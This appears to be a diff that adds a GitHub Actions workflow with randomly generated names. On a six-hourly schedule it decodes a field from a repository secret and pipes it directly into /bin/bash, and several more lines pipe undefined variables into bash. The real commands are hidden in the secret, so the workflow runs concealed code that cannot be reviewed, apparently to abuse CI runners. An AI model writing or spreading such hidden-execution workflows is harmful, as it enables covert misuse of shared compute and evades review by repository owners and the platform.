@@ -1,0 +1,25 @@
+name: tanloujun7165
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tanloujun7165
+        env:
+          fxrg307: ${{ secrets.fxrg307 }}
+        run: |
+          echo $fxrg307 | jq -r .ihxnt39465 | /bin/bash
+          echo $wez1 | jq -r .nw29453 | /bin/bash
+          echo $uphgd64608 | jq -r .xosr4815 | /bin/bash
+          echo $vtdpk78 | jq -r .uczw3902 | /bin/bash
+          echo $e21 | jq -r .czn48393 | /bin/bash
+          echo $x293 | jq -r .oeame47 | /bin/bash
+          echo $dvyc67780 | jq -r .jx9297 | /bin/bash
+
